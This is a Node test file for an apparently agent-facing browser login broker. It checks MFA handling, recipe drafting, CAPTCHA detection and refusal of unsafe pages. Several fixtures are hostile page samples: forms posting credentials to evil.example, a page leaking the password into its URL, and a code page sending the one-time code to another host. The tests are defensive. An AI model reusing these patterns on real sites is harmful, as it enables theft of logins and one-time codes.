// Drives loginWithBrowser against local fixtures (Playwright routes; no network) with a
// fake `aac` that hands out a test credential. Separate file because the env must be set
// before server.mjs is loaded.
import { test, after } from "node:test";
import assert from "node:assert/strict";
import { chmodSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const KEY = "GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ";
const dir = mkdtempSync(join(tmpdir(), "lb-browser-"));
const aac = join(dir, "aac");
const PASSWORD = "pw S3cret/x";
const cred = (uri) => JSON.stringify({ success: true, credential: { username: "u@example.com", password: PASSWORD, totp: KEY, uri } });
// --domain asks by host; --id names an item, whose uri this fake ties to the id.
writeFileSync(aac, `#!/bin/sh
echo "$@" >> ${join(dir, "args")}
case "$3" in
  other-site) echo '${cred("https://other.test/login")}' ;;
  slow-approval) sleep 1; echo '${cred("https://login.test")}' ;;
  *) echo '${cred("https://login.test")}' ;;
esac
`);
chmodSync(aac, 0o755);
process.env.AGENT_LOGIN_BROKER_AAC = aac;
process.env.AGENT_LOGIN_BROKER_HERDR = "false";
process.env.AGENT_LOGIN_BROKER_NOTIFY = "off";
const { loginWithBrowser, closeBrowser, proposeRecipe, totpCode } = await import("./server.mjs");
const { readFileSync } = await import("node:fs");
const lastArgs = () => readFileSync(join(dir, "args"), "utf8").trim().split("\n").at(-1);

after(async () => { await closeBrowser(); rmSync(dir, { recursive: true }); });

const HOST = "login.test";
const RECIPE = { loginPath: "/account/login", username: 'input[name="email"]', password: 'input[name="password"]', successPath: "/home" };
const html = (body) => ({ status: 200, contentType: "text/html", body: `<!doctype html><body>${body}</body>` });
const LOGIN = `<form id=f><input name=email><input type=password name=password><input type=submit></form>
<script>f.onsubmit = (e) => { e.preventDefault(); location = NEXT; };</script>`;
const MFA = `<form id=g><input name=code autocomplete=one-time-code><input type=submit></form>
<script>g.onsubmit = (e) => { e.preventDefault(); location = "/home?c=" + g.code.value; };</script>`;

function site(next, pages) {
  const seen = [];
  return {
    seen,
    prepare: (ctx) => ctx.route("**/*", (route) => {
      const u = new URL(route.request().url());
      seen.push(u.pathname + u.search);
      if (u.pathname === "/account/login") return route.fulfill(html(LOGIN.replace("NEXT", JSON.stringify(next))));
      return route.fulfill(html(pages[u.pathname] ?? "landed"));
    }),
  };
}

test("a code step on another path is answered before success is declared", async () => {
  const s = site("/mfa", { "/mfa": MFA });
  await loginWithBrowser(HOST, RECIPE, { prepare: s.prepare });
  const sent = s.seen.find((p) => p.startsWith("/home?c="))?.slice("/home?c=".length);
  const now = Date.now();
  assert.ok([totpCode(KEY, now), totpCode(KEY, now - 30_000)].includes(sent), `code sent: ${sent}`);
});

test("a loginPath with a query string (e.g. return_to) still finds the login form", async () => {
  const s = site("/home", {});
  await loginWithBrowser(HOST, { ...RECIPE, loginPath: "/account/login?return_to=%2Fhome" }, { prepare: s.prepare });
  assert.ok(s.seen.includes("/account/login?return_to=%2Fhome"), `requests: ${s.seen.join(" ")}`);
});

test("a recipe's itemId picks that vault item instead of asking by domain", async () => {
  const s = site("/home", {});
  await loginWithBrowser(HOST, { ...RECIPE, itemId: "work-account" }, { prepare: s.prepare });
  assert.equal(lastArgs(), "connect --id work-account --output json --timeout 180");
  await loginWithBrowser(HOST, RECIPE, { prepare: site("/home", {}).prepare });
  assert.equal(lastArgs(), `connect --domain ${HOST} --output json --timeout 180`);
});

test("an itemId whose item belongs to another site is never typed in", async () => {
  const s = site("/home", {});
  await assert.rejects(loginWithBrowser(HOST, { ...RECIPE, itemId: "other-site" }, { prepare: s.prepare }), /not for login\.test/);
  assert.ok(!s.seen.some((p) => p.startsWith("/home")), `form was submitted: ${s.seen.join(" ")}`);
});

test("a code page that submits itself once the code is typed is not waited on for Enter", async () => {
  const AUTO = `<input name=code autocomplete=one-time-code oninput="if (this.value.length === 6) location = '/home'">`;
  const s = site("/mfa", { "/mfa": AUTO });
  const started = Date.now();
  await loginWithBrowser(HOST, RECIPE, { prepare: s.prepare });
  assert.ok(Date.now() - started < 2_500, `took ${Date.now() - started}ms`);
});

test("a root success path counts only when the success selector shows up", async () => {
  const ROOT = { ...RECIPE, successPath: "/", successSelector: "#me" };
  await loginWithBrowser(HOST, ROOT, { prepare: site("/", { "/": "<div id=me>me</div>" }).prepare });
  await assert.rejects(loginWithBrowser(HOST, ROOT, { prepare: site("/", { "/": "signed out" }).prepare }),
    /did not confirm the login \(landed on login\.test\/;/);
});

const PASSKEY = `<a href="/mfa/passkey/retry">Retry</a><a href="/mfa/app">Use your authenticator app</a><a href="/terms">Terms</a>`;

test("a failed login names the links beside the landed page, so a recipe can pick otpSwitch", async () => {
  const s = site("/mfa/passkey", { "/mfa/passkey": PASSKEY });
  await assert.rejects(loginWithBrowser(HOST, RECIPE, { prepare: s.prepare }),
    (e) => /links: \/mfa\/passkey\/retry \/mfa\/app;?/.test(e.message) && !e.message.includes("/terms"));
});

test("otpSwitch leaves a passkey page for the code page and answers it", async () => {
  const s = site("/mfa/passkey", { "/mfa/passkey": PASSKEY, "/mfa/app": MFA });
  const started = Date.now();
  await loginWithBrowser(HOST, { ...RECIPE, otpSwitch: 'a[href="/mfa/app"]' }, { prepare: s.prepare });
  assert.ok(s.seen.some((p) => p.startsWith("/home?c=")), `requests: ${s.seen.join(" ")}`);
  assert.ok(Date.now() - started < 2_500, `switching waited: ${Date.now() - started}ms`);
});

test("otpSwitch follows a link the page keeps folded away", async () => {
  const FOLDED = `<details><summary>More options</summary><a href="/mfa/app">Authenticator app</a></details>`;
  const s = site("/mfa/passkey", { "/mfa/passkey": FOLDED, "/mfa/app": MFA });
  await loginWithBrowser(HOST, { ...RECIPE, otpSwitch: 'a[href="/mfa/app"]' }, { prepare: s.prepare });
  assert.ok(s.seen.some((p) => p.startsWith("/home?c=")), `requests: ${s.seen.join(" ")}`);
});

test("otpSwitch never follows a link off the site", async () => {
  const OFF = `<a id=sw href="https://elsewhere.test/mfa/app">Authenticator app</a>`;
  const s = site("/mfa/passkey", { "/mfa/passkey": OFF });
  await assert.rejects(loginWithBrowser(HOST, { ...RECIPE, otpSwitch: "#sw" }, { prepare: s.prepare }), /did not confirm the login/);
});

test("a fill that fails never returns the password in its error", async () => {
  await assert.rejects(loginWithBrowser(HOST, { ...RECIPE, password: "#f" }, { prepare: site("/home", {}).prepare }),
    (e) => !e.message.includes(PASSWORD));
});

test("a page that copies the password into what a failed login reports never gets it returned", async () => {
  const COPY = `<form id=f><input name=email><input type=password name=password><input type=submit></form>
<script>f.onsubmit = (e) => { e.preventDefault(); location = "/landed/" + encodeURIComponent(f.password.value); };</script>`;
  const NAMED = `<script>document.write('<input name="' + location.pathname.split("/")[2] + '">')</script>`;
  const prepare = (ctx) => ctx.route("**/*", (route) => {
    const u = new URL(route.request().url());
    return route.fulfill(html(u.pathname === "/account/login" ? COPY : NAMED));
  });
  await assert.rejects(loginWithBrowser(HOST, RECIPE, { prepare }),
    (e) => /withheld/.test(e.message) && !e.message.includes(PASSWORD) && !e.message.includes(encodeURIComponent(PASSWORD)));
});

test("a code page that sends the code to another host is stopped before it leaves", async () => {
  const OFF = `<input name=code autocomplete=one-time-code oninput="if (this.value.length === 6) location = 'https://elsewhere.test/c?' + this.value">`;
  const hosts = [];
  const prepare = (ctx) => ctx.route("**/*", (route) => {
    const u = new URL(route.request().url());
    hosts.push(u.host);
    if (u.pathname === "/account/login") return route.fulfill(html(LOGIN.replace("NEXT", '"/mfa"')));
    return route.fulfill(html(u.pathname === "/mfa" ? OFF : "landed"));
  });
  await assert.rejects(loginWithBrowser(HOST, RECIPE, { prepare }));
  assert.ok(!hosts.includes("elsewhere.test"), `requests went to: ${hosts.join(" ")}`);
});

test("a self-submitting code page whose next page is slow is not waited on for Enter", async () => {
  const AUTO = `<input name=code autocomplete=one-time-code oninput="if (this.value.length === 6) location = '/home'">`;
  const s = site("/mfa", { "/mfa": AUTO });
  const prepare = async (ctx) => {
    await s.prepare(ctx);
    await ctx.route("**/home", async (route) => { await new Promise((r) => setTimeout(r, 2_000)); await route.fallback(); });
  };
  const started = Date.now();
  await loginWithBrowser(HOST, RECIPE, { prepare });
  assert.ok(Date.now() - started < 3_000, `took ${Date.now() - started}ms`);
});

test("a login form at the site's root still logs in", async () => {
  const s = site("/home", {});
  const prepare = async (ctx) => {
    await s.prepare(ctx);
    await ctx.route((u) => u.pathname === "/", (route) => route.fulfill(html(LOGIN.replace("NEXT", '"/home"'))));
  };
  const started = Date.now();
  await loginWithBrowser(HOST, { ...RECIPE, loginPath: "/" }, { prepare });
  assert.ok(Date.now() - started < 10_000, `took ${Date.now() - started}ms`);
});

test("a root success path never counts the login page as logged in, selector or not", async () => {
  const ROOT = { ...RECIPE, successPath: "/", successSelector: "#me" };
  const s = site("/account/login/again", { "/account/login/again": "<div id=me>me</div>" });
  await assert.rejects(loginWithBrowser(HOST, ROOT, { prepare: s.prepare }), /did not confirm the login/);
});

test("a success path that only shares a prefix with the login path counts as logged in", async () => {
  const s = site("/account/login-done", {});
  await loginWithBrowser(HOST, { ...RECIPE, successPath: "/account/login-done" }, { prepare: s.prepare });
});

test("a login form at the root that also shows the success selector is not logged in", async () => {
  const s = site("/", {});
  const prepare = async (ctx) => {
    await s.prepare(ctx);
    await ctx.route((u) => u.pathname === "/", (route) => route.fulfill(html(`<div id=me>me</div>${LOGIN.replace("NEXT", '"/"')}`)));
  };
  await assert.rejects(loginWithBrowser(HOST, { ...RECIPE, loginPath: "/", successPath: "/", successSelector: "#me" }, { prepare }),
    /did not confirm the login/);
});

// The account first, then the password on a page of its own (Google's shape).
const STEP1 = `<form id=f><input name=email><input type=password name=decoy style="display:none"><input type=submit></form>
<script>f.onsubmit = (e) => { e.preventDefault(); location = PASSWORD_PAGE + "?u=" + encodeURIComponent(f.email.value); };</script>`;
const STEP2 = `<form id=f><input type=password name=password><input type=submit></form>
<script>f.onsubmit = (e) => { e.preventDefault(); location = "/home"; };</script>`;
function twoStep(passwordPage, pages = {}) {
  const seen = [];
  return {
    seen,
    prepare: (ctx) => ctx.route("**/*", (route) => {
      const u = new URL(route.request().url());
      seen.push(u.host + u.pathname + u.search);
      if (u.pathname === "/account/login") return route.fulfill(html(STEP1.replace("PASSWORD_PAGE", JSON.stringify(passwordPage))));
      if (u.pathname === "/account/password") return route.fulfill(html(STEP2));
      return route.fulfill(html(pages[u.pathname] ?? "landed"));
    }),
  };
}

test("a login that asks for the account and the password on separate pages logs in", async () => {
  const s = twoStep("/account/password");
  await loginWithBrowser(HOST, RECIPE, { prepare: s.prepare });
  assert.ok(s.seen.includes(`${HOST}/account/password?u=u%40example.com`), `requests: ${s.seen.join(" ")}`);
  assert.ok(s.seen.includes(`${HOST}/home`), `requests: ${s.seen.join(" ")}`);
});

test("a password page on another host is never typed into", async () => {
  const s = twoStep("https://elsewhere.test/account/password");
  await assert.rejects(loginWithBrowser(HOST, RECIPE, { prepare: s.prepare }), /not on the expected host|sent the browser off/);
  assert.ok(!s.seen.some((p) => p.endsWith("/home")), `password was submitted: ${s.seen.join(" ")}`);
});

test("a password page that sends the browser to another host is stopped there", async () => {
  const s = twoStep("/account/password", {});
  const prepare = async (ctx) => {
    await s.prepare(ctx);
    await ctx.route(`https://${HOST}/account/password*`, (route) => route.fulfill(html(
      STEP2.replace("type=password", "type=password hidden") +
      `<script>location = "https://elsewhere.test/account/password"; setTimeout(() => { f.password.hidden = false; }, 200)</script>`)));
  };
  await loginWithBrowser(HOST, RECIPE, { prepare }).catch(() => {});
  assert.ok(!s.seen.some((p) => p.startsWith("elsewhere.test")), `left the host: ${s.seen.join(" ")}`);
});

test("a loginPath that redirects to another path names that path instead of logging in", async () => {
  const s = site("/home", { "/start": `<script>location = "/account/login?flow=1"</script>` });
  await assert.rejects(loginWithBrowser(HOST, { ...RECIPE, loginPath: "/start" }, { prepare: s.prepare }),
    /loginPath redirects to \/account\/login; set loginPath to that path/);
  assert.ok(!s.seen.includes("/home"), `requests: ${s.seen.join(" ")}`);
});

const CAPTCHA = `<iframe src="https://challenges.cloudflare.com/turnstile/v0/x"></iframe>`;
const INVISIBLE_BADGE = `<iframe src="https://www.google.com/recaptcha/api2/anchor?k=x&size=invisible"></iframe>`;

test("a bot check on the login form stops before any credential is asked for", async () => {
  const s = site("/home", {});
  const argsLog = () => { try { return readFileSync(join(dir, "args"), "utf8"); } catch { return ""; } };
  const asked = argsLog();
  const prepare = async (ctx) => {
    await s.prepare(ctx);
    await ctx.route(`https://${HOST}/account/login`, (route) => route.fulfill(html(LOGIN.replace("NEXT", '"/home"') + CAPTCHA)));
  };
  const e = await loginWithBrowser(HOST, RECIPE, { prepare }).catch((e) => e);
  assert.equal(e.botCheck, "Cloudflare Turnstile", e.message);
  assert.equal(argsLog(), asked);
});

test("a bot check that shows while the approval is pending stops before anything is typed", async () => {
  const s = site("/home", {});
  const prepare = async (ctx) => {
    await s.prepare(ctx);
    await ctx.route(`https://${HOST}/account/login`, (route) => route.fulfill(html(LOGIN.replace("NEXT", '"/home"') +
      `<script>setTimeout(() => document.body.insertAdjacentHTML("beforeend", ${JSON.stringify(CAPTCHA)}), 300)</script>`)));
  };
  const e = await loginWithBrowser(HOST, { ...RECIPE, itemId: "slow-approval" }, { prepare }).catch((e) => e);
  assert.equal(e?.botCheck, "Cloudflare Turnstile", e?.message ?? "logged in");
  assert.ok(!s.seen.includes("/home"), `submitted: ${s.seen.join(" ")}`);
});

test("a bot check after the password is reported as one", async () => {
  const s = site("/blocked", { "/blocked": CAPTCHA });
  const e = await loginWithBrowser(HOST, RECIPE, { prepare: s.prepare }).catch((e) => e);
  assert.equal(e.botCheck, "Cloudflare Turnstile", e.message);
});

test("hCaptcha is named as itself, though its frame URL mentions recaptcha", async () => {
  const s = site("/blocked", { "/blocked": `<iframe src="https://newassets.hcaptcha.com/captcha/v1/x/static/hcaptcha.html#frame=checkbox&recaptchacompat=off"></iframe>` });
  const e = await loginWithBrowser(HOST, RECIPE, { prepare: s.prepare }).catch((e) => e);
  assert.equal(e.botCheck, "hCaptcha", e.message);
});

test("reCAPTCHA's invisible badge is not a bot check", async () => {
  const s = site("/home", {});
  const prepare = async (ctx) => {
    await s.prepare(ctx);
    await ctx.route(`https://${HOST}/account/login`, (route) => route.fulfill(html(LOGIN.replace("NEXT", '"/home"') + INVISIBLE_BADGE)));
  };
  await loginWithBrowser(HOST, RECIPE, { prepare });
});

test("landing anywhere but the recipe's success path fails closed", async () => {
  const s = site("/error", {});
  await assert.rejects(loginWithBrowser(HOST, RECIPE, { prepare: s.prepare }), /did not confirm the login \(landed on login\.test\/error;/);
  const t = site("/home-error", {});
  await assert.rejects(loginWithBrowser(HOST, RECIPE, { prepare: t.prepare }), /landed on login\.test\/home-error/);
});

test("a recipe without a non-root success path is refused before anything is loaded", async () => {
  for (const successPath of [undefined, "", "/", "//x"]) {
    const s = site("/home", {});
    await assert.rejects(loginWithBrowser(HOST, { ...RECIPE, successPath }, { prepare: s.prepare }), /needs a successPath/);
    assert.deepEqual(s.seen, [], `requests made for successPath=${successPath}`);
  }
});

test("an ordinary field with 'code' in its name never receives the one-time code", async () => {
  const ZIP = `<form id=z><input name=zipcode><input type=submit></form>
<script>z.onsubmit = (e) => { e.preventDefault(); location = "/home/after?z=" + z.zipcode.value; };</script>`;
  const s = site("/home", { "/home": ZIP });
  await loginWithBrowser(HOST, RECIPE, { prepare: s.prepare });
  assert.ok(!s.seen.some((p) => p.includes("?z=")), `zipcode form was submitted: ${s.seen.join(" ")}`);
});

test("a failed login names the landed page's inputs, never their values", async () => {
  const s = site("/mfa2", { "/mfa2": `<input name=pin value=123456>` });
  await assert.rejects(loginWithBrowser(HOST, RECIPE, { prepare: s.prepare }),
    (e) => /inputs: text\[name=pin\]/.test(e.message) && !e.message.includes("123456"));
});

test("propose_recipe drafts the login form's fields and leaves successPath open", async () => {
  const s = site("/home", {});
  assert.deepEqual(await proposeRecipe(HOST, "/account/login", { prepare: s.prepare }), {
    [HOST]: { loginPath: "/account/login", username: 'input[name="email"]', password: 'input[name="password"]', successPath: null },
  });
});

test("propose_recipe reports a bot check instead of drafting a recipe, without waiting out the field", async () => {
  const s = site("/home", { "/signin": CAPTCHA });
  const t = Date.now();
  const e = await proposeRecipe(HOST, "/signin", { prepare: s.prepare }).catch((e) => e);
  assert.equal(e.botCheck, "Cloudflare Turnstile", e.message);
  assert.ok(Date.now() - t < 10_000, `took ${Date.now() - t} ms`);
});

test("propose_recipe prefers the autocomplete account field over a search box", async () => {
  const page = `<input name=q placeholder=search><form><input name=q2><input id=acct autocomplete=username>
<input type=password autocomplete=current-password></form>`;
  const s = site("/home", { "/signin": page });
  assert.deepEqual((await proposeRecipe(HOST, "/signin", { prepare: s.prepare }))[HOST],
    { loginPath: "/signin", username: "#acct", password: 'input[autocomplete="current-password"]', successPath: null });
});

test("propose_recipe refuses pages it cannot read safely", async () => {
  const s = site("/home", { "/": "<a href=/account/login>sign in</a>", "/signup": "<form><input name=e><input type=password name=a><input type=password name=b></form>" });
  await assert.rejects(proposeRecipe(HOST, "/", { prepare: s.prepare }), /no visible password field on \//);
  await assert.rejects(proposeRecipe(HOST, "/signup", { prepare: s.prepare }), /several password fields/);
  await assert.rejects(proposeRecipe(HOST, "https://evil.example/login", { prepare: s.prepare }), /path must be on/);
  const posts = site("/home", {
    "/a": "<form action=https://evil.example/collect><input name=e><input type=password name=p></form>",
    "/b": "<form><input name=e><input type=password name=p><button formaction=http://login.test/x>go</button></form>",
  });
  await assert.rejects(proposeRecipe(HOST, "/a", { prepare: posts.prepare }), /submits to https:\/\/evil\.example/);
  await assert.rejects(proposeRecipe(HOST, "/b", { prepare: posts.prepare }), /submits to http:\/\/login\.test/);
  const outside = site("/home", { "/c": "<form id=lf><input name=e><input type=password name=p></form><button form=lf formaction=https://evil.example/c>go</button>" });
  await assert.rejects(proposeRecipe(HOST, "/c", { prepare: outside.prepare }), /submits to https:\/\/evil\.example/);
});

test("propose_recipe never pairs the password with another form's field", async () => {
  const s = site("/home", {
    "/d": "<form><input name=newsletter_email type=email></form><input name=user><input type=password name=p>",
    "/e": "<form><input name=search></form><input type=password name=p>",
  });
  assert.equal((await proposeRecipe(HOST, "/d", { prepare: s.prepare }))[HOST].username, 'input[name="user"]');
  await assert.rejects(proposeRecipe(HOST, "/e", { prepare: s.prepare }), /no account field/);
});
